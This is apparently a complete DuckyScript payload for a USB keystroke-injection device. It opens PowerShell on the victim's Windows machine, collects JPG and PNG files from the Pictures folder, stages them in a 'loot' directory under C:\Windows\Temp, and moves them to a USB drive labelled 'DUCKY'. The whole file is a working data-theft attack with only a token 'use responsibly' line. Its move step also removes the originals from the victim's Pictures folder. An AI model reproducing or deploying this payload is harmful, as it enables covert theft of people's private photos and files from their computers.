REM Written and tested by Dante Sparda
REM This script copies image files from the user's Pictures folder to a USB drive labeled "DUCKY"
REM Please use responsibly

DELAY 1000
GUI R
DELAY 1000
STRING powershell.exe
ENTER
DELAY 3000

REM Change directory to user's Pictures folder
STRING cd C:\Users\$env:Username\Pictures\
ENTER

REM Get all JPG and PNG files in the Pictures folder
STRING $files = Get-ChildItem -Path "C:\Users\$env:Username\Pictures\" -Include *.JPG, *.PNG
ENTER

REM Copy the files to the Temp directory
STRING Copy-Item -Path $files.FullName -Destination "C:\Windows\Temp" -Force
ENTER

REM Change directory to the Temp folder
STRING cd C:\Windows\Temp
ENTER

REM Create a loot directory in Temp
STRING mkdir loot
ENTER

REM Move files to the loot directory
STRING Move-Item -Path $files.FullName -Destination "C:\Windows\Temp\loot"
ENTER

REM Get the drive letter of the USB labeled "DUCKY"
STRING $destinationLetter = (Get-WmiObject -Class Win32_Volume | Where-Object {$_.Label -eq "DUCKY"}).Name
ENTER

REM Move the loot directory to the USB drive
STRING Move-Item -Path "C:\Windows\Temp\loot" -Destination $destinationLetter
ENTER

END
